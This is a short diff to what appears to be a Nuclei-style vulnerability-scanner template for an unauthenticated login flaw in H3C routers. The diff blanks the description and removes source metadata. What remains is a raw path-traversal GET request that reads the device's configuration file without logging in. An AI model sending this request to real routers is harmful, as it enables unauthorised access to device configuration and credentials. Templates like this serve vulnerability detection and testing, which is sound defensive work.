@@ -3,12 +3,8 @@ info:
   name: H3C多系列路由器存在任意用户登录漏洞_xx7w8r51tzzfe3z8
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: unauth,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: 暂无
 http:
 - raw:
   - 'GET /userLogin.asp/../actionpolicy_status/../ER2200G2.cfg HTTP/1.1
